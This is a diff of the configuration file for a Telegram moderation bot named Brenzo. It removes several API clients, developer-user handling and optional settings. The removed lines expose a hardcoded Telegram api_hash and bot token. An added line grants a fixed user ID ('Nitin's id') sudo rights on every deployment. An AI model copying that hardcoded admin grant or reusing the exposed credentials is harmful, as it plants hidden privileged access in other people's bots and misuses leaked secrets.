@@ -3,9 +3,6 @@ import os
 import sys
 
 import telegram.ext as tg
-from googletrans import Translator
-from pyrogram import Client
-from telethon import TelegramClient
 
 # enable logging
 logging.basicConfig(
@@ -23,8 +20,6 @@ ENV = bool(os.environ.get('ENV', False))
 
 if ENV:
     TOKEN = os.environ.get('TOKEN', None)
-    API_KEY = os.environ.get('API_KEY', None)
-    API_HASH = os.environ.get('API_HASH', None)
     try:
         OWNER_ID = int(os.environ.get('OWNER_ID', None))
     except ValueError:
@@ -35,9 +30,8 @@ if ENV:
 
     try:
         SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
     except ValueError:
-        raise Exception("Your sudo or dev users list does not contain valid integers.")
+        raise Exception("Your sudo users list does not contain valid integers.")
 
     try:
         SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "").split())
@@ -55,20 +49,20 @@ if ENV:
     CERT_PATH = os.environ.get("CERT_PATH")
 
     DB_URI = os.environ.get('DATABASE_URL')
+    DONATION_LINK = os.environ.get('DONATION_LINK')
     LOAD = os.environ.get("LOAD", "").split()
     NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
     DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
     STRICT_ANTISPAM = bool(os.environ.get('STRICT_GBAN', False))
     WORKERS = int(os.environ.get('WORKERS', 8))
     BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
-    AI_API_KEY = os.environ.get('AI_API_KEY', "")
     ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
     API_WEATHER = os.environ.get('API_WEATHER', None)
 
 
 else:
     from Brenzo.config import Development as Config
-    TOKEN = Config.TOKEN
+    TOKEN = Config.API_KEY
     try:
         OWNER_ID = int(Config.OWNER_ID)
     except ValueError:
@@ -79,9 +73,8 @@ else:
 
     try:
         SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
-        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
     except ValueError:
-        raise Exception("Your sudo or dev users list does not contain valid integers.")
+        raise Exception("Your sudo users list does not contain valid integers.")
 
     try:
         SUPPORT_USERS = set(int(x) for x in Config.SUPPORT_USERS or [])
@@ -99,44 +92,23 @@ else:
     CERT_PATH = os.environ.get("CERT_PATH")
 
     DB_URI = os.environ.get('DATABASE_URL')
+    DONATION_LINK = os.environ.get('DONATION_LINK')
     LOAD = os.environ.get("LOAD", "").split()
     NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
     DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
     STRICT_ANTISPAM = bool(os.environ.get('STRICT_GBAN', False))
     WORKERS = int(os.environ.get('WORKERS', 8))
     BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
-    AI_API_KEY = os.environ.get('AI_API_KEY', None)
     ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
     API_WEATHER = os.environ.get('API_WEATHER', None)
 
-# OpenWeather
-try:
-    WEATHER_API = os.environ.get('WEATHER_API')
-except ValueError:
-    raise Exception("Your 'WEATHER_API' variable is not a valid integer.")
-
 SUDO_USERS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
-
-# SpamWatch
-spamwatch_api = os.environ.get('sw_api', None)
-
-if spamwatch_api == "None":
-    spamwatch_api == None
+SUDO_USERS.add(680915808) #Nitin's id
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
 
-trl = Translator()
-
-# tbot = TelegramClient("Brenzo", API_KEY, API_HASH)
-
-pbot = Client("BrenzoPyro", api_id="3201985",
-              api_hash="41ae80228bc4eff613d987a2953cb139",
-              bot_token="1917122183:AAE1pwjrWDEKpQmcK1D2YYNXCGiBmyQQN28")
-
-SUDO_USERS = list(SUDO_USERS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS)
+SUDO_USERS = list(SUDO_USERS)
 WHITELIST_USERS = list(WHITELIST_USERS)
 SUPPORT_USERS = list(SUPPORT_USERS)
 
